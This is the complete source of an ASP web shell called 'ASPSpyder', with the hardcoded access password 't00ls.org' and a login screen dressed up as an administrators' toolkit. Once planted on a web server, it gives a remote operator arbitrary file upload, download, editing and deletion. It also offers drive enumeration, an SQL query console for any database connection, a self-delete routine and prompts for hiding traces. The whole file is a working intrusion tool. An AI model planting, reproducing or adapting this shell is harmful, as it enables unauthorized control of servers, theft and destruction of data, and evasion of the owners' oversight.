# password is t00ls.org
<%
Function BufferContent(data)
	Dim strContent(64)
	Dim i
	ClearString strContent
	For i = 1 To LenB(data)
		AddString strContent,Chr(AscB(MidB(data,i,1)))
	Next
	BufferContent = fnReadString(strContent)
End Function

Sub ClearString(part)
	Dim index
	For index = 0 to 64
		part(index)=""
	Next
End Sub

Sub AddString(part,newString)
	Dim tmp
	Dim index
	part(0) = part(0) & newString
	If Len(part(0)) > 64 Then
		index=0
		tmp=""
		Do
			tmp=part(index) & tmp
			part(index) = ""
			index = index + 1
		Loop until part(index) = ""
		part(index) = tmp
	End If
End Sub

Function fnReadString(part)
	Dim tmp
	Dim index
	tmp = ""
	For index = 0 to 64
		If part(index) <> "" Then
			tmp = part(index) & tmp
		End If
	Next
	FnReadString = tmp
End Function


Class FileUploader
	Public  Files
	Private mcolFormElem
	Private Sub Class_Initialize()
		Set Files = Server.CreateObject("Scripting.Dictionary")
		Set mcolFormElem = Server.CreateObject("Scripting.Dictionary")
	End Sub

	Private Sub Class_Terminate()
		If IsObject(Files) Then
			Files.RemoveAll()
			Set Files = Nothing
		End If
		If IsObject(mcolFormElem) Then
			mcolFormElem.RemoveAll()
			Set mcolFormElem = Nothing
		End If
	End Sub

	Public Property Get Form(sIndex)
		Form = ""
		If mcolFormElem.Exists(LCase(sIndex)) Then Form = mcolFormElem.Item(LCase(sIndex))
	End Property

	Public Default Sub Upload()
		Dim biData, sInputName
		Dim nPosBegin, nPosEnd, nPos, vDataBounds, nDataBoundPos
		Dim nPosFile, nPosBound
		biData = Request.BinaryRead(Request.TotalBytes)
		nPosBegin = 1
		nPosEnd = InstrB(nPosBegin, biData, CByteString(Chr(13)))
		If (nPosEnd-nPosBegin) <= 0 Then Exit Sub
		vDataBounds = MidB(biData, nPosBegin, nPosEnd-nPosBegin)
		nDataBoundPos = InstrB(1, biData, vDataBounds)
		Do Until nDataBoundPos = InstrB(biData, vDataBounds & CByteString("--"))
			nPos = InstrB(nDataBoundPos, biData, CByteString("Content-Disposition"))
			nPos = InstrB(nPos, biData, CByteString("name="))
			nPosBegin = nPos + 6
			nPosEnd = InstrB(nPosBegin, biData, CByteString(Chr(34)))
			sInputName = CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))
			nPosFile = InstrB(nDataBoundPos, biData, CByteString("filename="))
			nPosBound = InstrB(nPosEnd, biData, vDataBounds)
			If nPosFile <> 0 And  nPosFile < nPosBound Then
				Dim oUploadFile, sFileName
				Set oUploadFile = New UploadedFile
				nPosBegin = nPosFile + 10
				nPosEnd =  InstrB(nPosBegin, biData, CByteString(Chr(34)))
				sFileName = CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))
				oUploadFile.FileName = Right(sFileName, Len(sFileName)-InStrRev(sFileName, "\"))
				nPos = InstrB(nPosEnd, biData, CByteString("Content-Type:"))
				nPosBegin = nPos + 14
				nPosEnd = InstrB(nPosBegin, biData, CByteString(Chr(13)))
				oUploadFile.ContentType = CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))
				nPosBegin = nPosEnd+4
				nPosEnd = InstrB(nPosBegin, biData, vDataBounds) - 2
				oUploadFile.FileData = MidB(biData, nPosBegin, nPosEnd-nPosBegin)
				If oUploadFile.FileSize > 0 Then Files.Add LCase(sInputName), oUploadFile
			Else
				nPos = InstrB(nPos, biData, CByteString(Chr(13)))
				nPosBegin = nPos + 4
				nPosEnd = InstrB(nPosBegin, biData, vDataBounds) - 2
				If Not mcolFormElem.Exists(LCase(sInputName)) Then mcolFormElem.Add LCase(sInputName), CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))
			End If
			nDataBoundPos = InstrB(nDataBoundPos + LenB(vDataBounds), biData, vDataBounds)
		Loop
	End Sub

	'String to byte string conversion
	Private Function CByteString(sString)
		Dim nIndex
		For nIndex = 1 to Len(sString)
		   CByteString = CByteString & ChrB(AscB(Mid(sString,nIndex,1)))
		Next
	End Function

	'Byte string to string conversion
	Private Function CWideString(bsString)
		Dim nIndex
		CWideString =""
		For nIndex = 1 to LenB(bsString)
		   CWideString = CWideString & Chr(AscB(MidB(bsString,nIndex,1))) 
		Next
	End Function
End Class


Class UploadedFile
	Public ContentType
	Public FileName
	Public FileData
	Public Property Get FileSize()
		FileSize = LenB(FileData)
	End Property

	Public Sub SaveToDisk(sPath)
		Dim oFS, oFile
		Dim nIndex
		If sPath = "" Or FileName = "" Then Exit Sub
		If Mid(sPath, Len(sPath)) <> "\" Then sPath = sPath & "\"
		Set oFS = Server.CreateObject("Scripting.FileSystemObject")
		If Not oFS.FolderExists(sPath) Then Exit Sub
		Set oFile = oFS.CreateTextFile(sPath & FileName, True)
		' output mechanism modified for buffering
		oFile.Write BufferContent(FileData)
		oFile.Close
	End Sub

	Public Sub SaveToDatabase(ByRef oField)
		If LenB(FileData) = 0 Then Exit Sub
		If IsObject(oField) Then
			oField.AppendChunk FileData
		End If
	End Sub
End Class

' Create the FileUploader
IF REQUEST.QueryString("upload")="@" THEN
Dim Uploader, File
Set Uploader = New FileUploader

' This starts the upload process
Uploader.Upload()

%>
<html><title>ASPYDrvsInfo</title>
<style>
<!--
A:link {font-style: text-decoration: none; color: #c8c8c8}
A:visited {font-style: text-decoration: none; color: #777777}
A:active {font-style: text-decoration: none; color: #ff8300}
A:hover {font-style: text-decoration: cursor: hand; color: #ff8300}
*		{scrollbar-base-color:#777777;
scrollbar-track-color:#777777;scrollbar-darkshadow-color:#777777;scrollbar-face-color:#505050;
scrollbar-arrow-color:#ff8300;scrollbar-shadow-color:#303030;scrollbar-highlight-color:#303030;}
input,select,table {font-family:verdana,arial;font-size:11px;text-decoration:none;border:1px solid #000000;}
//-->
</style>
<body bgcolor=black text=white>
<BR><BR><BR>
<center><table bgcolor="#505050" cellpadding=4>
<tr><td><Font face=arial size=-1>File upload Information:</font>
</td></tr><tr><td bgcolor=black ><table>
<%

' Check if any files were uploaded
If Uploader.Files.Count = 0 Then
	Response.Write "File(s) not uploaded."
Else
	' Loop through the uploaded files
	For Each File In Uploader.Files.Items
		File.SaveToDisk Request.QueryString("txtpath")
		Response.Write "<TR><TD>&nbsp;</TD></TR><tr><td><font color=gray>File Uploaded: </font></td><td>" & File.FileName & "</td></tr>"
		Response.Write "<tr><td><font color=gray>Size: </font></td><td>" & Int(File.FileSize/1024)+1 & " kb</td></tr>"
		Response.Write "<tr><td><font color=gray>Type: </font></td><td>" & File.ContentType & "</td></tr>"
	Next
End If
%>
<TR><TD>&nbsp;</TD></TR></table>
</td></tr></table><BR><a href="<%=Request.Servervariables("SCRIPT_NAME")%>?txtpath=<%=Request.QueryString("txtpath")%>"><font face="webdings" title=" BACK " size=+2 >7</font></a></center>
<%
response.End() '---- XXX
END IF
'--------
ON ERROR RESUME NEXT
Response.Buffer = True
password = "t00ls.org" ' <---Your password here

If request.querystring("logoff")="@" then
	session("shagman")=""	' Logged off
	session("dbcon")=""		' Database Connection
	session("txtpath")=""	' any pathinfo
end if

	If (session("shagman")<>password) and Request.form("code")="" Then
		%>
<body bgcolor=black><center><BR><BR><BR><BR><FONT face=arial size=-2 color=#ff8300>ADMINSTRATORS TOOLKIT</FONT><BR><BR><BR>
<table><tr><td>
<FORM method="post" action="<%=Request.Servervariables("SCRIPT_NAME")%>" >
<table bgcolor=#505050 width="20%" cellpadding=20 ><tr><td bgcolor=#303030 align=center >
<INPUT type=password name=code ></td><td><INPUT name=submit type=submit value=" Access ">
</td></tr></table>
</td></tr><tr><td align=right>
<font color=white size=-2 face=arial >ASPSpyder Apr2003</font></td></tr>
</td></tr></table></FORM>
<%If request.querystring("logoff")="@" then%>
<font color=gray size=-2 face=arial title="To avoid anyone from seeing what you were doing by using the browser back button."><span style='cursor: hand;' OnClick=window.close(this);>CLOSE THIS WINDOW</font>
<%end if%>
<center>
		<%
		Response.END
	End If
	If Request.form("code") = password or session("shagman") = password Then
		session("shagman") = password
	Else
		Response.Write "<BR><B><P align=center><font color=red ><b>ACCESS DENIED</B></font><BR><font color=Gray >Copyright 2003 Vela iNC.</font></p>"
		Response.END
	End If

server.scriptTimeout=180
set fso = Server.CreateObject("Scripting.FileSystemObject")
mapPath = Server.mappath(Request.Servervariables("SCRIPT_NAME"))
mapPathLen = len(mapPath)

if session(myScriptName) = "" then
	for x = mapPathLen to 0 step -1
	myScriptName = mid(mapPath,x)
	if instr(1,myScriptName,"\")>0 then
		myScriptName = mid(mapPath,x+1)
		x=0
		session(myScriptName) = myScriptName
	end if
	next
Else
	myScriptName = session(myScriptName)
end if


wwwRoot = left(mapPath, mapPathLen - len(myScriptName))
Target = "D:\hshome\masterhr\masterhr.com\"  ' ---Directory to which files will be DUMPED Too and From

	if len(Request.querystring("txtpath"))=3 then
		pathname = left(Request.querystring("txtpath"),2) & "\" & Request.form("Fname")
	else
		pathname = Request.querystring("txtpath") & "\" & Request.form("Fname")
	end if

	If Request.Form("txtpath") = "" Then
	MyPath = Request.QueryString("txtpath")
	Else
	MyPath = Request.Form("txtpath")
	End If

' ---Path correction routine
	If len(MyPath)=1 then MyPath=MyPath & ":\"
	If len(MyPath)=2 then MyPath=MyPath & "\"
	If MyPath = "" Then MyPath = wwwRoot
	If not fso.FolderExists(MyPath) then
	Response.Write "<font face=arial size=+2>Non-existing path specified.<BR>Please use browser back button to continue !"
	Response.end
	end if

	set folder = fso.GetFolder(MyPath)

if fso.GetFolder(Target) = false then
	Response.Write "<font face=arial size=-2 color=red>Please create your target directory for copying files as it does not exist. </font><font face=arial size=-1 color=red>" & Target & "<BR></font>"
else
	set fileCopy = fso.GetFolder(Target)
end if


	If Not(folder.IsRootFolder) Then
		If len(folder.ParentFolder)>3 then
			showPath = folder.ParentFolder & "\" & folder.name
		Else
			showPath = folder.ParentFolder & folder.name
		End If
	Else
		showPath = left(MyPath,2)
	End If

MyPath=showPath
showPath=MyPath & "\"
' ---Path correction routine-DONE

set drv=fso.GetDrive(left(MyPath,2))

if Request.Form("cmd")="Download" then
 if Request.Form("Fname")<>"" then
	Response.Buffer = True
	Response.Clear
	strFileName = Request.QueryString("txtpath") & "\" & Request.Form("Fname")
	Set Sys = Server.CreateObject( "Scripting.FileSystemObject" )
	Set Bin = Sys.OpenTextFile( strFileName, 1, False )
	Call Response.AddHeader( "Content-Disposition", "attachment; filename=" & Request.Form("Fname") )
	Response.ContentType = "application/octet-stream"
	While Not Bin.AtEndOfStream
		Response.BinaryWrite( ChrB( Asc( Bin.Read( 1 ) ) ) )
	Wend
	Bin.Close : Set Bin = Nothing
	Set Sys = Nothing
 Else
 	err.number=500
	err.description="Nothing selected for download..."
 End if
End if
%>
<html>
<style>
<!--
A:link {font-style: text-decoration: none; color: #c8c8c8}
A:visited {font-style: text-decoration: none; color: #777777}
A:active {font-style: text-decoration: none; color: #ff8300}
A:hover {font-style: text-decoration: cursor: hand; color: #ff8300}
*		{scrollbar-base-color:#777777;
scrollbar-track-color:#777777;scrollbar-darkshadow-color:#777777;scrollbar-face-color:#505050;
scrollbar-arrow-color:#ff8300;scrollbar-shadow-color:#303030;scrollbar-highlight-color:#303030;}
input,select,table {font-family:verdana,arial;font-size:11px;text-decoration:none;border:1px solid #000000;}
//-->
</style>
<%
'QUERY ANALYSER -- START
if request.QueryString("qa")="@" then
'-------------
sub getTable(mySQL)
		if mySQL="" then
			exit sub
		end if
	on error resume next
	Response.Buffer = True
    	Dim myDBConnection, rs, myHtml,myConnectionString, myFields,myTitle,myFlag
		myConnectionString=session("dbCon")
    	Set myDBConnection = Server.CreateObject("ADODB.Connection")
    	myDBConnection.Open myConnectionString
		myFlag = False
		myFlag = errChk()
        	set rs = Server.CreateObject("ADODB.Recordset")
			rs.cursorlocation = 3
	    	rs.open mySQL, myDBConnection
			myFlag = errChk()

	if RS.properties("Asynchronous Rowset Processing") = 16 then
        	For i = 0 To rs.Fields.Count - 1
    			myFields = myFields & "<TD><font color=#eeeeee size=2 face=""Verdana, Arial, Helvetica, sans-serif"">" & rs.Fields(i).Name & "</font></TD>"
    		Next
			myTitle = "<font color=gray size=6 face=webdings>?</font><font color=#ff8300 size=2 face=""Verdana, Arial, Helvetica, sans-serif"">Query results :</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=gray><TT>(" & rs.RecordCount & " row(s) affected)</TT><br>"
		rs.MoveFirst
		rs.PageSize=mNR
		if int(rs.RecordCount/mNR) < mPage then mPage=1
        rs.AbsolutePage = mPage
		Response.Write myTitle & "</td><td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"
if mPage=1 Then Response.Write("<input type=button name=btnPagePrev value=""  <<  "" DISABLED>") else Response.Write("<input type=button name=btnPagePrev value=""  <<  "">")
Response.Write "<select name=cmbPageSelect>"
For x = 1 to rs.PageCount
	if x=mPage Then Response.Write("<option value=" & x & " SELECTED>" & x & "</option>") else Response.Write("<option value=" & x & ">" & x & "</option>")
Next
Response.Write "</select><input type=hidden name=mPage value=" & mPage & ">"
if mPage = rs.PageCount Then Response.Write("<input type=button name=btnPageNext value=""  >>  "" DISABLED>") else Response.Write("<input type=button name=btnPageNext value=""  >>  "">")
Response.Write "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=gray>Displaying <input type=text size=" & Len(mNR) & " name=txtNoRecords value=" & mNR & "> records at a time.</font>"
		response.Write "</td><TABLE border=0 bgcolor=#999999 cellpadding=2><TR align=center valign=middle bgcolor=#777777>" & myFields

        For x = 1 to rs.PageSize
          If Not rs.EOF Then
			response.Write "<TR>"
			For i = 0 to rs.Fields.Count - 1
				response.Write "<TD bgcolor=#dddddd>" & server.HTMLEncode(rs(i)) & "</TD>"
			Next
			response.Write "</TR>"
			response.Flush()
			rs.MoveNext
		  Else
		  	x=rs.PageSize
		  End If
		Next
		response.Write "</Table>"
		myFlag = errChk()

	else
		if not myFlag then
			myTitle = "<font color=#55ff55 size=6 face=webdings>i</font><font color=#ff8300 size=2 face=""Verdana, Arial, Helvetica, sans-serif"">Query results :</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=gray><TT>(The command(s) completed successfully.)</TT><br>"
			response.Write myTitle
		end if
	end if
		set myDBConnection = nothing
		set rs2 = nothing
		set rs = nothing
    
End sub

sub getXML(mySQL)
		if mySQL="" then
			exit sub
		end if
	on error resume next
	Response.Buffer = True
    	Dim myDBConnection, rs, myHtml,myConnectionString, myFields,myTitle,myFlag
		myConnectionString=session("dbCon")
    	Set myDBConnection = Server.CreateObject("ADODB.Connection")
    	myDBConnection.Open myConnectionString
		myFlag = False
		myFlag = errChk()
        	set rs = Server.CreateObject("ADODB.Recordset")
			rs.cursorlocation = 3
	    	rs.open mySQL, myDBConnection
			myFlag = errChk()
	if RS.properties("Asynchronous Rowset Processing") = 16 then
		Response.Write "<font color=#55ff55 size=4 face=webdings>i</font><font color=#cccccc> Copy paste this code and save as '.xml '</font></td></tr><tr><td>"
		Response.Write "<textarea cols=75 name=txtXML rows=15>"
		rs.MoveFirst
		response.Write vbcrlf & "<?xml version=""1.0"" ?>"
		response.Write vbcrlf & "<TableXML>"
		Do While Not rs.EOF
			response.Write vbcrlf & "<Column>"
			For i = 0 to rs.Fields.Count - 1
				response.Write  vbcrlf & "<" & rs.Fields(i).Name & ">"  & rs(i) & "</" & rs.Fields(i).Name & ">" & vbcrlf
				response.Flush()
			Next
			response.Write "</Column>"
		rs.MoveNext
		Loop
		response.Write "</TableXML>"
		response.Write "</textarea>"	
		myFlag = errChk()

	else
		if not myFlag then
			myTitle = "<font color=#55ff55 size=6 face=webdings>i</font><font color=#ff8300 size=2 face=""Verdana, Arial, Helvetica, sans-serif"">Query results :</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=gray><TT>(The command(s) completed successfully.)</TT><br>"
			response.Write myTitle
		end if
	end if
End sub

Function errChk()
	if err.Number <> 0 and err.Number <> 13 then
		dim myText
		myText = "<font color=#ff8300 size=4 face=webdings>x</font><font color=red size=2 face=""Verdana, Arial, Helvetica, sans-serif""> " & err.Description & "</font><BR>"
		response.Write myText
		err.Number = 0
		errChk = True
	end if
end Function

    Dim myQuery,mPage,mNR
	myQuery = request.Form("txtSQL")
	if request.form("txtCon") <> "" then session("dbcon") = request.form("txtCon")
	if request.QueryString("txtpath") then session("txtpath")=request.QueryString("txtpath")
	mPage=cint(request.Form("mPage"))
	if mPage<1 then mPage=1
	mNR=cint(request.Form("txtNoRecords"))
	if mNR<1 then mNR=30
%>
<html><title>ASPyQAnalyser</title>
<script language="VbScript">
sub cmdSubmit_onclick
	if Document.frmSQL.txtSQL.value = "" then
		Document.frmSQL.txtSQL.value = "SELECT * FROM " & vbcrlf & "WHERE " & vbcrlf & "ORDER BY "
		exit sub
	end if
	Document.frmSQL.Submit
end sub
sub cmdTables_onclick
	Document.frmSQL.txtSQL.value = "select name as 'TablesListed' from sysobjects where xtype='U' order by name"
	Document.frmSQL.Submit
end sub
sub cmdColumns_onclick
	strTable =InputBox("Return Columns for which Table?","Table Name...")
	strTable = Trim(strTable)
	if len(strTable) > 0 Then
		SQL = "select name As 'ColumnName',xusertype As 'DataType',length as Length from syscolumns where id=(select id from sysobjects where xtype='U' and name='" & strTable & "') order by name"
		Document.frmSQL.txtSQL.value = SQL
		Document.frmSQL.Submit	
	End if
end sub
sub cmdClear_onclick
	Document.frmSQL.txtSQL.value = ""
end sub
sub cmdBack_onclick
	Document.Location = "<%=Request.Servervariables("SCRIPT_NAME")%>?txtpath=<%=session("txtpath")%>"
end sub
Sub btnPagePrev_OnClick
	Document.frmSQL.mPage.value = Document.frmSQL.mPage.value - 1
	Document.frmSQL.Submit
end sub
Sub btnPageNext_OnClick
	Document.frmSQL.mPage.value = Document.frmSQL.mPage.value + 1
	Document.frmSQL.Submit
end sub
Sub cmbPageSelect_onchange
	Document.frmSQL.mPage.value = (Document.frmSQL.cmbPageSelect.selectedIndex + 1)
	Document.frmSQL.Submit
End Sub
Sub txtNoRecords_onclick
	Document.frmSQL.cmbPageSelect.selectedIndex = 0
	Document.frmSQL.mPage.value = 1
End Sub
</script>
<style>
	TR {font-family: sans-serif;}
</style>
<body bgcolor=black>
<form name=frmSQL action="<%=Request.Servervariables("SCRIPT_NAME")%>?qa=@" method=Post>
<table border="0"><tr>
      <td align=right><font color=#ff8300 size="4" face="webdings">@ </font><font color="#CCCCCC" size="1" face="Verdana, Arial, Helvetica, sans-serif">Paste 
        your connection string here : </font><font color="#CCCCCC"> 
        <input name=txtCon type="text" size="60" value="<%=session("dbcon")%>">
        </font><BR>
        <textarea cols=75 name=txtSQL rows=4 wrap=PHYSICAL><%=myQuery%></textarea><BR>
        <input name=cmdSubmit type=button value=Submit><input name=cmdTables type=button value=Tables><input name=cmdColumns type=button value=Columns><input name="reset" type=reset value=Reset><input name=cmdClear type=button value=Clear><input name=cmdBack type=button value="Return"><input type="Checkbox" name="chkXML" <%IF Request.Form("chkXML")= "on" tHEN Response.Write " checked " %>><font color="#CCCCCC" size="1" face="Verdana, Arial, Helvetica, sans-serif">GenerateXML</FONT>
    </td>
	<td>XXXXXX</td><td>
	<center><B>ASP</b><font color=#ff8300 face=webdings size=6 >!</font><B><font color=Gray >Spyder</font> Apr2003</B><BR><font color=black size=-2><TT>by ~sir_shagalot</TT></font></center>
	</td></tr></table>
<table><tr><td><%If Request.Form("chkXML") = "on"  Then getXML(myQuery) Else getTable(myQuery) %></td></tr></table></form>
<HR><P align=right><font color=#ff8300><TT>Copyright 2003 Vela iNC.</B></font><BR><font size=-1 color=gray>Cheers to <a href="mailto:hAshish@shagzzz.cjb.net">hAshish</a> for all the help!</font></p><BR>
</body>
</html>
<%
		set myDBConnection = nothing
		set rs2 = nothing
		set rs = nothing
'-------------
response.End()
end if
'QUERY ANALYSER -- STOP
%>
<title><%=MyPath%></title>
</head>
<body bgcolor=black text=white topAprgin="0">
<!-- Copyright Vela iNC. Apr2003 [www.shagzzz.cjb.net] Coded by ~sir_shagalot -->
<%
		Response.Flush
'Code Optimisation START
select case request.form("cmd")
	case ""
		If request.form("dirStuff")<>"" then
			Response.write "<font face=arial size=-2>You need to click [Create] or [Delete] for folder operations to be</font>"
		Else
			Response.Write "<font face=webdings size=+3 color=#ff8300>&#1570;</font>"
		End If
	case "   Copy   "
	' ---Copy From Folder routine Start
		If Request.Form("Fname")="" then
		Response.Write "<font face=arial size=-2 color=#ff8300>Copying: " & Request.QueryString("txtpath") & "\???</font><BR>"
			err.number=424
		Else
			Response.Write "<font face=arial size=-2 color=#ff8300>Copying: " & Request.QueryString("txtpath") & "\" & Request.Form("Fname") & "</font><BR>"
			fso.CopyFile Request.QueryString("txtpath") & "\" & Request.Form("Fname"),Target & Request.Form("Fname")
			Response.Flush
		End If
	' ---Copy From Folder routine Stop
	case "  Copy "
	' ---Copy Too Folder routine Start
		If Request.Form("ToCopy")<>"" and Request.Form("ToCopy") <> "------------------------------" Then
			Response.Write "<font face=arial size=-2 color=#ff8300>Copying: " & Request.Form("txtpath") & "\" & Request.Form("ToCopy") & "</font><BR>"
			Response.Flush
			fso.CopyFile Target & Request.Form("ToCopy"), Request.Form("txtpath") & "\" & Request.Form("ToCopy")
		Else
		Response.Write "<font face=arial size=-2 color=#ff8300>Copying: " & Request.Form("txtpath") & "\???</font><BR>"
			err.number=424
		End If
	' ---Copy Too Folder routine Stop
	case "Delete"		'two of this
	if request.form("todelete")<>"" then
	' ---File Delete start
		If (Request.Form("ToDelete")) = myScriptName then'(Right(Request.Servervariables("SCRIPT_NAME"),len(Request.Servervariables("SCRIPT_NAME"))-1)) Then
		Response.Write "<center><font face=arial size=-2 color=#ff8300><BR><BR><HR>SELFDESTRUCT INITIATED...<BR>"
			Response.Flush
			fso.DeleteFile Request.Form("txtpath") & "\" & Request.Form("ToDelete")
				%>+++DONE+++</font><BR><HR>
				<font color=gray size=-2 face=arial title="To avoid anyone from seeing what you were doing by using the browser back button."><span style='cursor: hand;' OnClick=window.close(this);>CLOSE THIS WINDOW</font>
			<%Response.End
		End If
		If Request.Form("ToDelete") <> "" and Request.Form("ToDelete") <> "------------------------------" Then
			Response.Write "<font face=arial size=-2 color=#ff8300>Deleting: " & Request.Form("txtpath") & "\" & Request.Form("ToDelete") & "</font><BR>"
			Response.Flush
			fso.DeleteFile Request.Form("txtpath") & "\" & Request.Form("ToDelete")
		Else
			Response.Write "<font face=arial size=-2 color=#ff8300>Deleting: " & Request.Form("txtpath") & "\???</font><BR>"
			err.number=424
		End If
	' ---File Delete stop
		Else If request.form("dirStuff")<>"" then
			Response.Write "<font face=arial size=-2 color=#ff8300>Deleting folder...</font><BR>"
			fso.DeleteFolder MyPath & "\" & request.form("DirName")
		end if
	End If

	case "Edit/Create"
%>
<center><BR><table bgcolor="#505050" cellpadding="8"><tr>
    <td bgcolor="#000000" valign="bottom">
	<Font face=arial SIZE=-2 color=#ff8300>NOTE: The following edit box maynot display special characters from files. Therefore the contents displayed maynot be considered correct or accurate.</font>
	</td></tr><tr><td><TT>Path=> <%=pathname%><BR><BR>
<%
 		' fetch file information 
		Set f = fso.GetFile(pathname) 
%>
file Type: <%=f.Type%><BR>
file Size: <%=FormatNumber(f.size,0)%> bytes<BR>
file Created: <%=FormatDateTime(f.datecreated,1)%>&nbsp;<%=FormatDateTime(f.datecreated,3)%><BR>
last Modified: <%=FormatDateTime(f.datelastmodified,1)%>&nbsp;<%=FormatDateTime(f.datelastmodified,3)%><BR>
last Accessed: <%=FormatDateTime(f.datelastaccessed,1)%>&nbsp;<%=FormatDateTime(f.datelastaccessed,3)%><BR>
file Attributes: <%=f.attributes%><BR>
<%
	Set f = Nothing
	response.write "<center><FORM action=""" & Request.Servervariables("SCRIPT_NAME") & "?txtpath=" & MyPath & """ METHOD=""POST"">"
		'read the file
		Set f = fso.OpenTextFile(pathname)
		If NOT f.AtEndOfStream Then fstr = f.readall
		f.Close
		Set f = Nothing
		Set fso = Nothing
		response.write "<TABLE><TR><TD>" & VBCRLF
		response.write "<FONT TITLE=""Use this text area to view or change the contents of this document. Click [Save As] to store the updated contents to the web server."" FACE=arial SIZE=1 ><B>DOCUMENT CONTENTS</B></FONT><BR>" & VBCRLF
		response.write "<TEXTAREA NAME=FILEDATA ROWS=16 COLS=85 WRAP=OFF>" & Server.HTMLEncode(fstr) & "</TEXTAREA>" & VBCRLF
		response.write "</TD></TR></TABLE>" & VBCRLF
%>
<BR><center><TT>LOCATION <INPUT TYPE="TEXT" SIZE=48 MAXLENGTH=255 NAME="PATHNAME" VALUE="<%=pathname%>">
<INPUT TYPE="SUBMIT" NAME=cmd VALUE="Save As" TITLE="This write to the file specifed and overwrite it without warning.">
<INPUT TYPE="SUBMIT" NAME="POSTACTION" VALUE="Cancel" TITLE="If you recieve an error while saving, then most likely you do not have write access OR the file attributes are set to readonly !!">
</FORM></td></tr></table><BR>
<%
response.end

	case "Create"
		Response.Write "<font face=arial size=-2 color=#ff8300>Creating folder...</font><BR>"
		fso.CreateFolder MyPath & "\" & request.form("DirName")

	case "Save As"
		Response.Write "<font face=arial size=-2 color=#ff8300>Saving file...</font><BR>"
		Set f = fso.CreateTextFile(Request.Form("pathname"))
		f.write Request.Form("FILEDATA")
		f.close
end select
'Code Optimisation STOP
' ---DRIVES start here
	If request.querystring("getDRVs")="@" then
%>
<BR><BR><BR><center><table bgcolor="#505050" cellpadding=4>
<tr><td><Font face=arial size=-1>Available Drive Information:</font>
</td></tr><tr><td bgcolor=black >
<table><tr><td><tt>Drive</td><td><tt>Type</td><td><tt>Path</td><td><tt>ShareName</td><td><tt>Size[MB]</td><td><tt>ReadyToUse</td><td><tt>VolumeLabel</td><td></tr>
<%For Each thingy in fso.Drives%>
<tr><td><tt>
<%=thingy.DriveLetter%> </td><td><tt> <%=thingy.DriveType%> </td><td><tt> <%=thingy.Path%> </td><td><tt> <%=thingy.ShareName%> </td><td><tt> <%=((thingy.TotalSize)/1024000)%> </td><td><tt> <%=thingy.IsReady%> </td><td><tt> <%=thingy.VolumeName%>
<%Next%>
</td></tr></table>
</td></tr></table><BR><a href="<%=Request.Servervariables("SCRIPT_NAME")%>?txtpath=<%=MyPath%>"><font face="webdings" title=" BACK " size=+2 >7</font></a></center>
<%
	Response.end
	end if
' ---DRIVES stop here
%>
<HEAD>
<SCRIPT Language="VBScript">
sub getit(thestuff)
if right("<%=showPath%>",1) <> "\" Then
   document.myform.txtpath.value = "<%=showPath%>" & "\" & thestuff
Else
   document.myform.txtpath.value = "<%=showPath%>" & thestuff
End If
document.myform.submit()
End sub
</SCRIPT>
</HEAD>
<%	
'---Report errors
select case err.number
	case "0"
	response.write "<font face=webdings color=#55ff55>i</font> <font face=arial size=-2>Successfull..</font>"

	case "58"
	response.write "<font face=arial size=-1 color=red>Folder already exists OR no folder name specified...</font>"

	case "70"
	response.write "<font face=arial size=-1 color=red>Permission Denied, folder/file is readonly or contains such files...</font>"

	case "76"
	response.write "<font face=arial size=-1 color=red>Path not found...</font>"

	case "424"
	response.write "<font face=arial size=-1 color=red>Missing, Insufficient data OR file is readonly...</font>"
	
	case else
	response.write "<font face=arial size=-1 color=red>" & err.description & "</font>"

end select
'---Report errors end
%>
<center><B>ASP</b><font color=#ff8300 face=webdings size=6 >!</font><B><font color=Gray >Spyder</font> Apr2003</B><BR><font color=black size=-2><TT>by ~sir_shagalot</TT></font></center>
<font face=Courier>
<table><tr><td>
<form method="post" action="<%=Request.Servervariables("SCRIPT_NAME")%>" name="myform" >
<Table bgcolor=#505050 ><tr><td bgcolor=#505050 >
<font face=Arial size=-2 color=#ff8300 > PATH INFO : </font></td><td align=right ><font face=Arial size=-2 color=#ff8300 >Volume Label:</font> <%=drv.VolumeName%> </td></tr>
<tr><td colspan=2 cellpadding=2 bgcolor=#303030 ><font face=Arial size=-1 color=gray>Virtual: http://<%=Request.ServerVariables("SERVER_NAME")%><%=Request.Servervariables("SCRIPT_NAME")%></Font><BR><font face=wingdings color=Gray >1</font><font face=Arial size=+1 > <%=showPath%></Font>
<BR><input type=text width=40 size=60 name=txtpath value="<%=showPath%>" ><input type=submit name=cmd value="  View  " >
</td></tr></form></table>
</td><td><center>
<table bgcolor=#505050 cellpadding=4><tr><td bgcolor=black ><a href="<%=Request.Servervariables("SCRIPT_NAME")%>?getDRVs=@&txtpath=<%=MyPath%>"><font size=-2 face=arial>Retrieve Available Network Drives</a></td></tr>
<tr><td bgcolor=black align=right><A HREF="<%=Request.Servervariables("SCRIPT_NAME")%>?qa=@&txtpath=<%=MyPath%>"><font size=-2 face=arial>SQL Query Analyser</A></td></tr>
<tr><td bgcolor=black  align=right><A HREF="<%=Request.Servervariables("SCRIPT_NAME")%>?logoff=@&...thankyou.for.using.ASpyder....~sir_shagalot!..[shagzzz.cjb.net]"><font size=-2 face=arial>+++LOGOFF+++</A></td></tr></table>
</td></tr></table>
<p align=center ><Table width=75% bgcolor=#505050 cellpadding=4 ><tr><td>
<form method="post" action="<%=Request.Servervariables("SCRIPT_NAME")%>" ><font face=arial size=-1 >Delete file from current directory:</font><BR>
<select size=1 name=ToDelete >
<option>------------------------------</option>"
<%
fi=0
For each file in folder.Files
	Response.Write "<option>" & file.name & "</option>"
fi=fi+1
next
	Response.Write "</select><input type=hidden name=txtpath value=""" & MyPath & """><input type=Submit name=cmd value=Delete ></form></td><td>"
	Response.Write "<form method=post name=frmCopyFile action=""" & Request.Servervariables("SCRIPT_NAME") & """ ><font face=arial size=-1 >Copy file too current directory:</font><br><select size=1 name=ToCopy >"
	Response.Write "<option>------------------------------</option>"
For each file in fileCopy.Files
	Response.Write "<option>" & file.name & "</option>"
next
	Response.Write "</select><input type=hidden name=txtpath value=""" & MyPath & """><input type=Submit name=cmd value=""  Copy "" ></form></td></tr></Table>"
Response.Flush
